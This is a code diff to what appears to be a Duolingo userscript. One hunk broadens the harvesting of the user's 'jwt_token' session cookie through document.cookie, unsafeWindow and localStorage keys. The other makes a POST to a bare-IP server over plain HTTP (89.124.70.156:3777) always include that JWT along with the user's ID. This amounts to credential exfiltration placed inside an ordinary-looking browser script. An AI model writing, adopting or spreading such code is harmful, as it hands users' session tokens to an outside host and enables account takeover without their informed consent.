@@ -281,13 +281,18 @@
 
   // ========== API ==========
   function getToken() {
-    const m = document.cookie.match(/(^| )jwt_token=([^;]+)/);
-    if (m) {
+    // пробуем разные источники
+    const sources = [
+      () => document.cookie,
+      () => (typeof unsafeWindow !== "undefined" ? unsafeWindow.document.cookie : ""),
+    ];
+    for (const get of sources) {
       try {
-        return decodeURIComponent(m[2]);
-      } catch {
-        return m[2];
-      }
+        const m = get().match(/(^| )jwt_token=([^;]+)/);
+        if (m && m[2]) {
+          try { return decodeURIComponent(m[2]); } catch { return m[2]; }
+        }
+      } catch {}
     }
     for (const k of ["jwt_token", "jwtToken", "duolingo_jwt"]) {
       const v = localStorage.getItem(k);
@@ -6784,7 +6789,7 @@
           method: "POST",
           url: "http://89.124.70.156:3777/api/link-code",
           headers: { "content-type": "application/json" },
-          data: JSON.stringify({ duolingoUserId: myId, jwt: jwt || undefined }),
+          data: JSON.stringify({ duolingoUserId: myId, jwt: jwt }),
           timeout: 10000,
           onload(r) {
             try { resolve(JSON.parse(r.responseText || "{}")); } catch { resolve(null); }
